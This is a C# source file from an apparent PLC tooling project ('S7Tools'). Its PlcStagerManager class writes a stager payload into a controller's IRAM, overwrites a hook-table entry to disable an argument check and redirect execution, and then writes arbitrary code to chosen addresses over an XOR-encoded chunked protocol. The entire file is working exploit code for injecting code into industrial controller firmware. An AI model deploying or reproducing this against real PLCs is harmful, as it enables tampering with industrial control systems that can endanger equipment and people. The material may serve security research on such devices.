using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace S7Tools.Services.Adapters.Plc
{
    internal class PlcStagerManager
    {
        private readonly PlcProtocolHandler _protocol;
        private readonly PlcMemoryManager _memory;

        public PlcStagerManager(PlcProtocolHandler protocol, PlcMemoryManager memory)
        {
            _protocol = protocol ?? throw new ArgumentNullException(nameof(protocol));
            _memory = memory ?? throw new ArgumentNullException(nameof(memory));
        }

        public async Task InstallStagerAsync(byte[] stager, CancellationToken cancellationToken)
        {
            // 1. Write Stager Code to IRAM
            await _memory.WriteToIramAsync(PlcConstants.IRAM_STAGER_START, stager, cancellationToken);

            // 2. Overwrite Hook Entry
            // Hook Entry Structure: [Unknown:2] [ArgCheck:2] [Address:4]
            // We write at Offset + 2 to skip Unknown.
            // Payload: [0x00, 0xFF] (Disable Arg Check) + [Address (Big Endian)]
            var hookPayload = new byte[6];
            hookPayload[0] = 0x00;
            hookPayload[1] = 0xFF;
            var addrBytes = PlcInternalHelpers.GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
            Array.Copy(addrBytes, 0, hookPayload, 2, 4);

            uint hookEntryAddr = PlcConstants.ADD_HOOK_TABLE_START + (8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND) + 2;
            await _memory.WriteToIramAsync(hookEntryAddr, hookPayload, cancellationToken);
        }

        public async Task InstallAddHookViaStagerAsync(uint targetAddr, byte[] payload, int hookNo, CancellationToken cancellationToken)
        {
            // 1. Write Hook Entry
            // Ref StagerManager L174
            var hookEntry = new byte[8];
            hookEntry[3] = 0xFF; // Variable
            Array.Copy(PlcInternalHelpers.GetBigEndianBytes(targetAddr), 0, hookEntry, 4, 4); // Addr at end

            uint tableAddr = PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * hookNo);

            // WRITE VIA STAGER (Hook 7)
            await WriteViaStagerAsync(tableAddr, hookEntry, cancellationToken);

            // 2. Write Code
            await WriteViaStagerAsync(targetAddr, payload, cancellationToken);
        }

        public async Task WriteViaStagerAsync(uint address, byte[] data, CancellationToken cancellationToken)
        {
            // Ref StagerManager L157
            // Invoke Hook 7 with Address -> Then Send Data
            await _protocol.InvokeAddHookAsync(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, PlcInternalHelpers.GetBigEndianBytes(address), false, cancellationToken);
            await SendFullMsgViaStagerAsync(data, cancellationToken);
        }

        private async Task SendFullMsgViaStagerAsync(byte[] msg, CancellationToken cancellationToken)
        {
            // Stager XOR Protocol
            int maxChunk = PlcConstants.MAX_MSG_LEN;
            for (int i = 0; i < msg.Length; i += maxChunk)
            {
                int size = Math.Min(maxChunk, msg.Length - i);
                var chunk = msg.Skip(i).Take(size).ToArray();
                var encoded = PlcInternalHelpers.EncodeWithXor(chunk);

                await _protocol.SendPacketAsync(encoded, 8, cancellationToken: cancellationToken);
                // Ack
                var ack = await _protocol.ReceivePacketAsync(cancellationToken);
                if (ack == null || ack.Length != 1)
                {
                    throw new Exception("Stager ACK fail");
                }
            }
            // End Packet
            await _protocol.SendPacketAsync(PlcInternalHelpers.EncodeWithXor(Array.Empty<byte>()), null, cancellationToken: cancellationToken);
            await _protocol.ReceivePacketAsync(cancellationToken);
        }
    }
}
